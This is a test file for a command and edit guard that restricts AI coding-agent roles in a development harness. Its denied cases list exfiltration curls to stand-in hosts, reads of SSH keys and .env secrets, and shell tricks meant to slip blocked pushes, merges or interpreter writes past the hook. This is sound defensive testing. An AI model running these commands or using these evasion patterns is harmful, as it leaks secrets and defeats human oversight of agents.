import assert from 'node:assert/strict';
import { test } from 'node:test';
import { evaluate } from '../scripts/guard-lib.mjs';

const ctx = { branch: 'task/APP-12-fix-thing', containerOnly: true, service: 'devcontainer' };
const denied = (c) => assert.equal(evaluate(c, ctx).deny, true, c);
const allowed = (c) => assert.equal(evaluate(c, ctx).deny, false, c);

test('merge, review and api writes are denied', () => {
	denied('gh pr merge 12 --squash');
	denied('gh pr review 12 --approve');
	denied('gh pr ready 12');
	denied('gh api -X POST repos/acme/app/merges');
	denied('gh api repos/x/y --method DELETE');
	allowed('gh pr view 12 --json state');
	allowed('gh api repos/acme/app/pulls/12');
	allowed('gh pr create --draft --title "Fix: x [APP-12]"');
	allowed('gh pr comment 12 --body-file body.md --attach ./shot.png#state');
});

test('only the ticket branch may be pushed', () => {
	allowed('git push -u origin task/APP-12-fix-thing');
	allowed('git push origin HEAD');
	denied('git push origin HEAD:develop');
	denied('git push origin develop');
	denied('git push origin other-branch');
	denied('git push --force origin task/APP-12-fix-thing');
	denied('git push origin +task/APP-12-fix-thing');
	denied('git push origin :task/APP-12-fix-thing');
});

test('destructive git is denied', () => {
	denied('git reset --hard HEAD~1');
	denied('git branch -D old');
	denied('git clean -fd');
	denied('git checkout develop');
	allowed('git status && git diff origin/develop...HEAD --stat');
});

test('commit hooks may be skipped', () => {
	allowed('git commit -n -m x');
	allowed('git commit -m x --no-verify');
	allowed('git push --no-verify -u origin task/APP-12-fix-thing');
});

test('chained commands are checked per segment', () => {
	denied('git add -A && git commit -m x; gh pr merge 3');
	denied('echo hi | gh pr review 3');
});

test('host installs and tests are denied, container execs are not', () => {
	denied('npm ci');
	denied('npx vitest run');
	denied('GH=1 npm install lodash');
	allowed('docker compose -p df-app-12 exec -T -u node devcontainer npx vitest run');
	allowed('yarn --cwd clients/mobile install');
});

test('direct tracker access and docker prune are denied', () => {
	denied('curl -s https://api.notion.com/v1/pages');
	denied('curl -s https://example.atlassian.net/rest/api/3/issue/APP-1');
	denied('docker system prune -af');
	denied('docker volume prune -f');
});

test('a reviewer may read and record but not write, install or push', () => {
	const r = (c) => evaluate(c, { role: 'reviewer', branch: 'task/APP-12-fix-thing' });
	for (const ok of [
		'git diff origin/develop...HEAD --stat',
		'git log --oneline -5 && git show HEAD --stat',
		'grep -rn "TODO" services/api/routes',
		'cat .cursor/rules/nodejs-standards.mdc | head -40',
		'sed -n 1,40p services/api/app.js',
		'find services -name "*.test.js"',
		`node dev-factory/bin/qa.mjs review record --axis spec --head abc --summary "x" --findings '[]'`,
		'ls clients 2>/dev/null',
	])
		assert.equal(r(ok).deny, false, ok);
	for (const bad of [
		'git commit -am x',
		'git push origin HEAD',
		'npm install',
		'echo hi > file.txt',
		'sed -i s/a/b/ file.js',
		'find . -name "*.js" -delete',
		'rm -rf services',
		'curl https://example.com',
		'node dev-factory/bin/qa.mjs record --run 1 --case a --status pass',
		'docker compose exec devcontainer bash',
	])
		assert.equal(r(bad).deny, true, bad);
});

import { evaluateEdit } from '../scripts/guard-lib.mjs';

test('inside a run, factory files and run state are protected; own code and own cases are not', () => {
	const run = { key: 'APP-12', role: 'builder' };
	const e = (filePath, extra = {}) => evaluateEdit({ filePath, root: '/w', active: true, run, ...extra });
	for (const bad of [
		'dev-factory/scripts/guard-lib.mjs',
		'/w/dev-factory/config.json',
		'.claude/settings.json',
		'.github/workflows/ci_system.yml',
		'.dev-factory/review/abc-spec.json',
		'.dev-factory/qa/run-1.json',
		'.dev-factory/run.json',
		'dev-factory/qa/cases/APP-99/x.yaml',
	]) {
		assert.equal(e(bad).deny, true, bad);
	}
	for (const ok of [
		'services/api/routes/a.js',
		'clients/mobile/src/App.tsx',
		'dev-factory/qa/cases/APP-12/login.yaml',
		'.dev-factory/build.done',
		'.dev-factory/blocked.json',
	]) {
		assert.equal(e(ok).deny, false, ok);
	}
	assert.equal(evaluateEdit({ filePath: 'services/a.js', root: '/w', active: true, run: { role: 'reviewer' } }).deny, true);
});

test('outside a run only the vocabulary rule applies', () => {
	const w = (filePath, text) => evaluateEdit({ filePath, text, root: '/w', active: false });
	assert.equal(w('dev-factory/scripts/x.sh', 'fine text').deny, false);
	assert.equal(w('dev-factory/README.md', 'mention of ' + 'co' + '-work here').deny, true);
	assert.equal(w('services/api/a.js', 'night' + 'shift').deny, false);
	assert.equal(w('.claude/settings.json', '{}').deny, false);
});

test('shell writes to run state, records and factory code are denied; qa.mjs and reads are not', () => {
	const ctx = { branch: 'task/APP-12-fix-thing', containerOnly: true, service: 'devcontainer' };
	const d = (c) => assert.equal(evaluate(c, ctx).deny, true, c);
	const a = (c) => assert.equal(evaluate(c, ctx).deny, false, c);
	d('echo {} > .dev-factory/review/abc-spec.json');
	d('cp /tmp/x.png .dev-factory/evidence/APP-12/run-1/a.png');
	d('sed -i s/a/b/ dev-factory/scripts/guard-lib.mjs');
	d('rm -rf .dev-factory/qa');
	d('echo x | tee .claude/settings.json');
	a('cat .dev-factory/env.json');
	a('ls .dev-factory/review');
	a('touch .dev-factory/build.done');
	a(`node dev-factory/bin/qa.mjs record --run 1 --case a --status pass --assertion "banner visible" --screenshot /tmp/a.png`);
	a('cat > dev-factory/qa/cases/APP-12/login.yaml');
});

test('a read-only role may cd into the worktree but cd gives it no write path', () => {
	const r = (c, role = 'reviewer') => evaluate(c, { role }).deny;
	assert.equal(r('cd /Users/x/code/.worktrees/app/APP-1 && git diff origin/develop...HEAD --stat'), false);
	assert.equal(r('cd ../.worktrees/APP-1 && node dev-factory/bin/qa.mjs review status'), false);
	assert.equal(r('cd /Users/x/wt && git diff', 'debugger'), false);
	assert.equal(r('cd /Users/x/wt && rm -rf services'), true);
	assert.equal(r('cd /Users/x/wt && git push origin HEAD'), true);
});

test('debugger reads the ticket stack and records, nothing else', () => {
	const d = (c) => evaluate(c, { role: 'debugger' }).deny;
	for (const c of [
		'git diff origin/develop...HEAD --stat',
		'node dev-factory/bin/qa.mjs debug status',
		'node dev-factory/bin/qa.mjs scrub --file /tmp/x.md',
		'docker compose -f .devcontainer/docker-compose.yml -p df-APP-1 ps',
		'docker compose -p df-APP-1 logs --tail 50 api',
		'docker compose -f c.yml -p df-APP-1 exec -T devcontainer pm2 logs --nostream',
		'docker compose -p df-APP-1 exec -T devcontainer pm2 jlist',
		'curl -ksf https://api.app.local/api/v4/ping',
		'docker compose -f c.yml -p df-APP-1 exec -T -u node devcontainer npx vitest run services/api/x.test.js',
		'docker compose -p df-APP-1 exec -T devcontainer npm test',
		'docker compose -p df-APP-1 exec -T devcontainer node --test test/a.test.mjs',
		'grep -rn timeout services/api | head -20',
	])
		assert.equal(d(c), false, c);
	for (const c of [
		'npm test',
		'npx vitest run',
		'docker compose -p df-APP-1 exec -T devcontainer rm -rf /workspace',
		'docker compose -p df-APP-1 exec -T devcontainer npm test > out.txt',
		'docker compose -p df-APP-1 down',
		'curl -ks -X POST https://api.app.local/x',
		'curl -ks https://example.com/',
		'curl -ks https://api.app.local/x -o /tmp/out',
		'echo hi > file.txt',
		'git push origin HEAD',
		'npm install',
		'node dev-factory/bin/qa.mjs record --run 1',
	])
		assert.equal(d(c), true, c);
});

test('debugger and reviewer may not edit files', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	for (const role of ['debugger', 'reviewer'])
		assert.equal(evaluateEdit({ filePath: 'services/api/x.ts', root: '/r', active: true, run: { role } }).deny, true, role);
});

test('stop gate: bug tickets need a root cause, debuggers need a new record', async () => {
	const { decide } = await import('../scripts/stop-gate-lib.mjs');
	const has =
		(...files) =>
		(f) =>
			files.includes(f);
	const bug = { role: 'builder', until: 'build', kind: 'bug' };
	assert.equal(decide({ run: bug, has: has('build.done') }).finished, false);
	assert.equal(decide({ run: bug, has: has('build.done'), debug: { hasRootCause: true, open: [] } }).finished, true);
	assert.equal(decide({ run: bug, has: has('needs_debug.json') }).finished, true);
	assert.equal(decide({ run: { role: 'builder', until: 'build', kind: 'story' }, has: has('build.done') }).finished, true);
	const dbg = { role: 'debugger', debugBefore: 1 };
	assert.equal(decide({ run: dbg, has: has(), debug: { recorded: 1, open: [] } }).finished, false);
	assert.equal(decide({ run: dbg, has: has(), debug: { recorded: 2, open: [] } }).finished, true);
	assert.equal(decide({ run: dbg, has: has(), debug: { recorded: 2, open: [3] } }).finished, false);
	assert.equal(decide({ run: dbg, has: has(), debug: { recorded: 1, recordedAll: 2, open: [], openAll: [] } }).finished, true);
	assert.equal(decide({ run: dbg, has: has('blocked.json') }).finished, true);
	assert.equal(decide({ run: { role: 'reviewer', axis: 'spec' }, has: has('review/abc-spec.json'), head: 'abc' }).finished, true);
});

test('debug records are protected from shell and edit writes', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	assert.equal(evaluate('echo {} > .dev-factory/debug/001.json', ctx).deny, true);
	assert.equal(
		evaluateEdit({ filePath: '.dev-factory/debug/001.json', root: '/r', active: true, run: { role: 'builder', key: 'APP-1' } }).deny,
		true,
	);
});

test('researcher writes one file and nothing else', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	const run = { role: 'researcher', key: 'APP-9' };
	const e = (filePath) => evaluateEdit({ filePath, root: '/r', active: true, run }).deny;
	assert.equal(e('docs/plans/APP-9/research.md'), false);
	assert.equal(e('services/api/x.ts'), true);
	assert.equal(e('docs/plans/APP-8/research.md'), true);
	const { decide } = await import('../scripts/stop-gate-lib.mjs');
	assert.equal(decide({ run, has: (f) => f === '../docs/plans/APP-9/research.md' }).finished, true);
	assert.equal(decide({ run, has: () => false }).finished, false);
});

test('improver changes the factory but not what enforces it', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	const { decide } = await import('../scripts/stop-gate-lib.mjs');
	const run = { role: 'improver', key: 'APP-5', kind: 'improvement' };
	const e = (filePath) => evaluateEdit({ filePath, text: '', root: '/r', active: true, run }).deny;
	assert.equal(e('dev-factory/skills/implement/SKILL.md'), false);
	assert.equal(e('dev-factory/IMPROVEMENT-PLAN.md'), false);
	assert.equal(e('dev-factory/test/frontier.test.mjs'), false);
	for (const f of [
		'dev-factory/scripts/guard-lib.mjs',
		'dev-factory/scripts/stop-gate.mjs',
		'dev-factory/bin/qa.mjs',
		'dev-factory/hooks/hooks.json',
		'dev-factory/settings.factory.json',
		'dev-factory/config.json',
		'services/api/x.ts',
		'.github/workflows/ci.yml',
	])
		assert.equal(e(f), true, f);
	assert.equal(decide({ run, has: (f) => f === 'improve.done' }).finished, true);
	assert.equal(decide({ run, has: () => false }).finished, false);
	assert.equal(evaluate('git push origin ai-tooling/APP-5-x', { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, false);
	assert.equal(evaluate('git push origin develop', { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, true);
	assert.equal(evaluate('gh pr merge 3', { role: 'improver' }).deny, true);
});

test('promoter edits only AGENTS.md files outside dev-factory and writes only through the edit tools', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	const { decide } = await import('../scripts/stop-gate-lib.mjs');
	const run = { role: 'promoter', key: 'APP-6' };
	const e = (filePath) => evaluateEdit({ filePath, text: '', root: '/r', active: true, run }).deny;
	assert.equal(e('clients/mobile/AGENTS.md'), false);
	assert.equal(e('AGENTS.md'), false);
	for (const f of ['CLAUDE.md', '.cursor/rules/testing.mdc', 'dev-factory/AGENTS.md', 'services/api/x.ts']) assert.equal(e(f), true, f);
	assert.equal(evaluate('echo x >> services/api/x.ts', { role: 'promoter' }).deny, true);
	assert.equal(evaluate('git commit -m "Add rules [APP-6]"', { role: 'promoter' }).deny, false);
	assert.equal(decide({ run, has: (f) => f === 'promote.done' }).finished, true);
	assert.equal(decide({ run, has: () => false }).finished, false);
});

test('every role may write its hand-off sentinel, none may write review or run state', async () => {
	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
	for (const role of ['reviewer', 'debugger', 'researcher', 'improver', 'promoter', 'builder']) {
		const run = { role, key: 'APP-9' };
		const e = (filePath) => evaluateEdit({ filePath, root: '/r', active: true, run }).deny;
		for (const f of ['blocked.json', 'improve.done', 'promote.done', 'needs_debug.json'])
			assert.equal(e(`/r/.dev-factory/${f}`), false, `${role} ${f}`);
		for (const f of ['review/abc-spec.json', 'run.json', 'env.json', 'debug/001.json'])
			assert.equal(e(`/r/.dev-factory/${f}`), true, `${role} ${f}`);
	}
	assert.equal(evaluate('echo {} > .dev-factory/promote.done', { role: 'promoter' }).deny, false);
	assert.equal(evaluate('echo {} > .dev-factory/review/x.json', { role: 'promoter' }).deny, true);
});

const builder = (c, extra = {}) => evaluate(c, { branch: 'feature/APP-1-x', role: 'builder', containerOnly: true, ...extra }).deny;

test('git is judged by its subcommand whatever global option or wrapper precedes it', () => {
	for (const c of [
		'git -c advice.detachedHead=false push --force origin main',
		'git -C /tmp push --force origin develop',
		'command git push --force origin main',
		'/usr/bin/git push --force origin main',
		'\\git push -f origin feature/APP-1-x',
		'env GIT_TRACE=1 git push --force origin main',
		'xargs -n 1 git push --force origin',
		'nohup git push origin main',
		'git --git-dir=/x/.git push origin HEAD:main',
		'git -c alias.p=push p --force origin main',
		'git -c core.hooksPath=/dev/null commit -m x',
		'git -C /w reset --hard origin/main',
		'bash -c "git push --force origin main"',
		"sh -c 'git push origin develop'",
		'echo $(git push --force origin main)',
		'echo `git push --force origin main`',
		'git push origin feature/APP-1-x & git push --force origin main',
	])
		assert.equal(builder(c), true, c);
	for (const c of [
		'git -C /w status',
		'git -C /w diff origin/develop...HEAD --stat',
		'git -c advice.detachedHead=false checkout feature/APP-1-x',
		'/usr/bin/git log --oneline -3',
		'command git diff',
		'git -C /w push -u origin feature/APP-1-x',
		'cmd 2>&1 | tee /tmp/log',
		'git commit -m "fix git push handling"',
	])
		assert.equal(builder(c), false, c);
});

test('with no ticket branch known (the scheduler itself) nothing is pushed', () => {
	assert.equal(evaluate('git push origin HEAD', {}).deny, true);
	assert.equal(evaluate('git push origin feature/x', {}).deny, true);
	assert.equal(evaluate('git -C /w merge --no-edit origin/develop', {}).deny, false);
});

test('gh api with a body field, input or non-GET method is a write; wrappers and repo flags do not hide gh', () => {
	for (const c of [
		'gh api repos/acme/app/pulls/1/merge -f merge_method=squash',
		'gh api repos/acme/app/pulls/1/reviews -f event=APPROVE -f body=lgtm',
		'gh api repos/x/y/pulls/1/reviews --input review.json',
		'gh api repos/x/y/issues --raw-field title=x',
		'gh api repos/x/y/issues --field title=x',
		'gh api repos/x/y/issues -F title=x',
		'gh api repos/x/y/issues -ftitle=x',
		'gh api graphql -f query=mutation',
		'gh api --method=PUT repos/x/y/pulls/1/merge',
		'gh api repos/x/y -X DELETE',
		'gh -R acme/app pr merge 1',
		'gh pr -R acme/app merge 1',
		'gh --repo x/y pr review 1 --approve',
		'command gh pr merge 1',
		'gh alias set m "pr merge"',
		'gh secret set X',
	])
		assert.equal(builder(c), true, c);
	for (const c of [
		'gh api repos/acme/app/pulls/12/comments --jq ".[] | .body"',
		'gh api --method GET repos/x/y/pulls/1',
		'gh pr view 12 --json reviews',
		'gh pr -R acme/app view 12',
	])
		assert.equal(builder(c), false, c);
});

test('inline interpreter code is refused: the hook cannot see what it writes', () => {
	for (const c of [
		`node -e "require('fs').writeFileSync('.dev-factory/run.json','{}')"`,
		'node --eval "x"',
		'node -p "1"',
		`python3 -c "open('dev-factory/scripts/guard-lib.mjs','w')"`,
		'python -c "x"',
		'ruby -e "x"',
		'perl -e "x"',
		`awk 'BEGIN{system("id")}'`,
		'osascript -e "x"',
		'eval "git push --force origin main"',
		'docker compose -p df-APP-1 exec -T devcontainer node -e "x"',
		'echo x | python3 -c "import sys"',
	])
		assert.equal(builder(c), true, c);
	for (const c of [
		'node --test dev-factory/test/guard.test.mjs',
		'node dev-factory/bin/qa.mjs show --run 1',
		'python3 scripts/tool.py',
		'docker compose -p df-APP-1 exec -T devcontainer node --test test/a.test.mjs',
		'grep -rn "node -e" docs',
	])
		assert.equal(builder(c), false, c);
	for (const role of ['improver', 'promoter']) assert.equal(evaluate(`python3 -c "x"`, { role, branch: 'ai-tooling/APP-5-x' }).deny, true, role);
});

test('env files are not readable from the shell by any role', () => {
	for (const role of ['builder', 'reviewer', 'debugger', 'researcher', 'improver', 'promoter', undefined]) {
		for (const c of [
			'cat dev-factory/.env.local',
			'cat .env',
			'grep TOKEN dev-factory/.env.local',
			'head -1 ./.env.production',
			"cat 'dev-factory/.env.local'",
		])
			assert.equal(evaluate(c, { role, branch: 'b' }).deny, true, `${role}: ${c}`);
	}
	assert.equal(evaluate('cat dev-factory/.env.example', { role: 'builder', branch: 'b' }).deny, false);
	assert.equal(evaluate('cat dev-factory/.env.example', { role: 'reviewer' }).deny, false);
});

test('a read-only role has no interpreter, no output option and no way to write through an allowed command', () => {
	for (const role of ['reviewer', 'debugger']) {
		const d = (c) => evaluate(c, { role }).deny;
		for (const c of [
			`awk 'BEGIN{system("id")}'`,
			"sed -n 'w /tmp/x' README.md",
			'sed -n 1,5w/tmp/x README.md',
			'git diff --output=/tmp/out',
			'git log --output /tmp/out',
			'git grep -O"sh -c id" foo',
			'git grep --open-files-in-pager=sh foo',
			'find . -fprint /tmp/x',
			'find . -fprintf /tmp/x %p',
			'find . -fls /tmp/x',
			'sort -o /tmp/x README.md',
			'sort --output=/tmp/x README.md',
			'rg --pre sh foo',
			'uniq in.txt out.txt',
			'echo $(id)',
			'echo `id`',
			'cat $HOME/.ssh/id_rsa',
			'cat ${HOME}/x',
			'diff <(id) x',
			'cat dev-factory/.env.local',
			'/usr/bin/git diff',
			'command git diff',
			'git -C /w diff',
			'env git diff',
		])
			assert.equal(d(c), true, `${role}: ${c}`);
		for (const c of [
			"sed -n '10p' README.md",
			'sed -n 1,40p services/api/app.js',
			"sed -n '5,$p' README.md",
			'sort README.md | uniq -c | head',
			'git diff origin/develop...HEAD -- services/api',
			'git grep -n timeout -- services',
			'find services -name "*.test.js" -newer package.json',
			'grep -rEn "foo$|bar" services',
		])
			assert.equal(d(c), false, `${role}: ${c}`);
	}
});

test('the debugger curl rule is anchored to a plain *.app.local URL', () => {
	const d = (c) => evaluate(c, { role: 'debugger' }).deny;
	assert.equal(d('curl -ksf https://api.app.local/api/v4/ping'), false);
	assert.equal(d('curl -s http://api.app.local:3000/health?x=1'), false);
	for (const c of [
		'curl https://evil.app.local/$(whoami)',
		'curl https://evil.app.local/`whoami`',
		'curl https://api.app.local/x?a=${HOME}',
		'curl https://api.app.local/x;id',
		'curl https://api.app.local.evil.com/x',
		'curl https://api.app.local@evil.com/x',
		'curl https://api.app.local/x https://evil.com/y',
		'curl https://api.app.local/ --data x',
	])
		assert.equal(d(c), true, c);
});

test('shell writes of review records, run state and factory code through an interpreter are refused', () => {
	for (const c of [
		`node -e "fs.writeFileSync('.dev-factory/review/h-spec.json','{}')"`,
		`python3 -c "open('.dev-factory/review/h-spec.json','w').write('{}')"`,
		`perl -e 'open F,">dev-factory/scripts/guard-lib.mjs"'`,
	]) {
		assert.equal(evaluate(c, { role: 'builder', branch: 'b' }).deny, true, c);
		assert.equal(evaluate(c, { role: 'improver', branch: 'b' }).deny, true, c);
	}
});

test('a quoted assignment prefix and nested substitutions do not hide the command', () => {
	for (const c of [
		'FOO="a b" gh pr merge 123',
		'FOO="a b" git push --force origin feat/x',
		"FOO='a b' git push origin main",
		'A="x y" B=z git reset --hard',
		'env FOO="a b" git push --force origin main',
		'env FOO="a b" gh pr merge 1',
		'echo $(gh pr merge 1 $(true))',
		'echo $(git push --force $(true))',
		'echo $(echo $(echo $(gh pr merge 1)))',
		'echo "$(git push --force origin main)"',
		'echo $(true; gh pr merge 1)',
		'bash -c "echo $(gh pr merge 1 $(true))"',
		'echo `gh pr merge 1`',
	])
		assert.equal(builder(c), true, c);
	for (const c of ['FOO="a b" git status', 'echo $(git rev-parse HEAD)', 'echo "$(git log --oneline -1)"', 'A="x y" node --test a.test.mjs'])
		assert.equal(builder(c), false, c);
	assert.equal(evaluate('echo $(cat $(echo /etc/passwd))', { role: 'reviewer' }).deny, true);
});

test('the whole factory directory, hook wiring and husky are protected from shell writes, except the ticket own cases', () => {
	for (const c of [
		'cat > dev-factory/settings.factory.json <<EOF',
		'echo x > dev-factory/.mcp.json',
		'rm dev-factory/test/guard.test.mjs',
		'echo x >> dev-factory/README.md',
		'cp /tmp/x dev-factory/AGENTS.md',
		'mv /tmp/x dev-factory/qa/profiles.yaml',
		'echo x > ./dev-factory/IMPROVEMENT-PLAN.md',
		'echo x > .husky/pre-commit',
		'echo x > .dev-factory/compose.override.yml',
		'git mv dev-factory/README.md /tmp/x',
	]) {
		assert.equal(builder(c), true, c);
		assert.equal(evaluate(c, { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, true, `improver: ${c}`);
		assert.equal(evaluate(c, { role: 'reviewer' }).deny, true, `reviewer: ${c}`);
	}
	for (const c of [
		'cat > dev-factory/qa/cases/APP-12/login.yaml',
		'cat dev-factory/settings.factory.json',
		'ls dev-factory/test && wc -l dev-factory/README.md',
		'node --test dev-factory/test/guard.test.mjs',
		'rm -f .dev-factory/stop-nudges',
	])
		assert.equal(builder(c), false, c);
});

test('services are not installed or tested on the host through yarn, pnpm or the playwright runner either', () => {
	for (const c of [
		'yarn test',
		'yarn jest services/api',
		'yarn vitest run',
		'yarn --cwd clients/mobile test',
		'pnpm test',
		'pnpm install',
		'pnpm run test',
		'npm --prefix services/api test',
		'npx playwright test',
		'npx jest services/api',
	])
		assert.equal(builder(c), true, c);
	for (const c of [
		'yarn --cwd clients/mobile install',
		'docker compose -p df-APP-1 exec -T devcontainer yarn test',
		'docker compose -p df-APP-1 exec -T devcontainer npx playwright test',
		'yarn prettier --check .',
	])
		assert.equal(builder(c), false, c);
});

test('host installs and tests are allowed when the repository has no container environment', () => {
	const host = (c) => evaluate(c, { branch: 'task/APP-12-fix-thing', role: 'builder', containerOnly: false }).deny;
	assert.equal(host('npm test'), false);
	assert.equal(host('npx vitest run'), false);
	assert.equal(host('yarn install'), false);
	assert.equal(host('git push --force origin task/APP-12-fix-thing'), true, 'the rest of the guard still applies');
});
